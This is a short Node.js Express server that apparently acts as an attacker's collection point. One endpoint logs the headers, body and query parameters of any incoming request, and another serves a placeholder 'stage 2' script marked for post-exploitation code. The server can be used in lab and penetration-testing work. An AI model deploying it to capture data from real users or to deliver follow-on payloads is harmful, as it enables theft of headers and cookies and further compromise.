const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
const host = 'localhost'; // Change this to your own website

app.use(bodyParser.json());

app.all('/capture', (req, res) => {
  console.log('Captured Headers:', req.headers);
  if (req.method === 'POST') {
    console.log('POST Body:', req.body);
  } else {
    console.log('GET Params:', req.query);
  }
  res.status(200).send('Data received');
});

app.get('/stage2.js', (req, res) => {
  res.type('application/javascript').send(`
    console.log('Stage 2 loaded...');
    // Add post-exploitation here
  `);
});

app.listen(port, () => {
  console.log(`Server running at http://${host}:${port}`);
});
